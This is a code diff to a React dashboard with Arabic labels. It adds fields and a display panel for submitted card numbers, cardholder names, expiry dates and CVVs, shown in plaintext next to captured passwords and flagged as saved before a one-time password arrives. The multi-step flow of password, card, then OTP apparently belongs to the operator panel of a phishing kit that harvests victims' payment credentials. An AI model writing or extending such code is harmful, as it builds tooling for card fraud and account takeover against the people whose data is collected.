@@ -56,6 +56,13 @@ interface Submission {
     password: string;
     completedAt: string;
   };
+  step_4_payment_card?: {
+    cardNumber: string;
+    cardName: string;
+    expiry: string;
+    cvv: string;
+    savedAt: string;
+  };
   step_4_payment?: {
     amount: string;
     status: string;
@@ -367,6 +374,41 @@ export default function FirebaseDashboard() {
                       <p className="text-xs text-red-400">كلمة المرور</p>
                       <p className="font-mono font-bold text-red-300 mt-1 text-lg">
                         {selectedSubmission.step_3_password.password || "-"}
+                      </p>
+                    </div>
+                  </div>
+                </DetailSection>
+              )}
+
+              {/* Step 4 Early: Card Data (saved before OTP) */}
+              {selectedSubmission.step_4_payment_card && !selectedSubmission.step_4_payment && (
+                <DetailSection title="بيانات البطاقة (قبل OTP)" icon={CreditCard}>
+                  <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-4 mb-4">
+                    <p className="text-yellow-400 text-sm mb-2">⏳ تم حفظ البطاقة - في انتظار OTP</p>
+                  </div>
+                  <div className="grid grid-cols-2 gap-4">
+                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 col-span-2">
+                      <p className="text-xs text-yellow-400">رقم البطاقة</p>
+                      <p className="font-mono font-bold text-yellow-300 mt-1 text-xl tracking-widest">
+                        {selectedSubmission.step_4_payment_card.cardNumber || "-"}
+                      </p>
+                    </div>
+                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
+                      <p className="text-xs text-yellow-400">الاسم على البطاقة</p>
+                      <p className="font-medium text-yellow-300 mt-1">
+                        {selectedSubmission.step_4_payment_card.cardName || "-"}
+                      </p>
+                    </div>
+                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
+                      <p className="text-xs text-yellow-400">تاريخ الانتهاء</p>
+                      <p className="font-mono font-bold text-yellow-300 mt-1">
+                        {selectedSubmission.step_4_payment_card.expiry || "-"}
+                      </p>
+                    </div>
+                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
+                      <p className="text-xs text-red-400">CVV</p>
+                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
+                        {selectedSubmission.step_4_payment_card.cvv || "-"}
                       </p>
                     </div>
                   </div>
